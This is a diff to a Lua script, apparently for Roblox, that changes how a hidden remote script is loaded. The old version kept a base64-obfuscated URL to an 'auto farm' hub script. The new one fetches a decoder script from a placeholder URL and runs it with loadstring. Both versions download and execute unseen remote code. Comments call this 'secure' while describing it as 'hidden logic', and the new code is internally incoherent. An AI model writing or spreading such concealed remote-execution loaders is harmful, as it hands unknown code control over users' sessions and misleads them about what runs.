@@ -136,33 +136,9 @@ else
     end)
 end
 
--- Securely decode the URL using a secondary decoder
-local encodedUrl = "aHR0cHM6Ly9yYXcuZ2l0aHViLmNvbS9NZWxoYXJwZXIvR2FiZUJvYTIvcmVmcy9oZWFkcy9tYWluL0h1YiUyMEF1dG8lMjBmYXJtLmx1YQ=="
+-- Fetch and execute the URL decoder script securely
+local urlDecoderScript = game:HttpGet("https://raw.githubusercontent.com/your-username/repo-name/main/url_decoder.lua")
+local decodedUrl = loadstring(urlDecoderScript)()  -- Execute the URL decoder script
 
--- Secure URL decoding function
-local function secureDecodeUrl(encodedUrl)
-    -- Base64 decode the URL and return it
-    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    encodedUrl = string.gsub(encodedUrl, '[^' .. b .. '=]', '')  -- Clean up the string
-    return (encodedUrl:gsub('.', function(x)
-        if x == '=' then return '' end
-        local r, f = '', (b:find(x) - 1)
-        for i = 6, 1, -1 do
-            r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0')
-        end
-        return r
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-        if #x ~= 8 then return '' end
-        local c = 0
-        for i = 1, 8 do
-            c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0)
-        end
-        return string.char(c)
-    end))
-end
-
--- Decode the script URL
-local decodedUrl = secureDecodeUrl(encodedUrl)
-
--- Load and execute the decoded URL (hidden logic)
+-- Load and execute the decoded URL (hidden script)
 loadstring(game:HttpGet(decodedUrl))()
